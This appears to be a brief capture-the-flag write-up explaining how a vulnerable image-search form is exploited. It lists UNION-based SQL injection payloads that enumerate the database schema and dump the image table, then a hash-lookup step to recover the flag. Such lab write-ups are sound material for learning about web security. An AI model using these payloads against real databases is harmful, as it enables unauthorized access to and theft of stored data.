Forms must be protected in order to stop an attacker from introducing malicious
code or executing database queries. In this case, we have a vulnerable form that
lets us execute SQL requests and find all the information about whats inside
the database

1. Navigate to the search image page
2. Write the following command in the form and submit to list the table names:
   - 1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
3. Write the following command in the form and submit to list the image comments:
   - 1 or 1=2 UNION select url, comment from list_images
4. Decrypt the password via : https://md5hashing.net/hash/sha256 and rehash
   it to get the flag
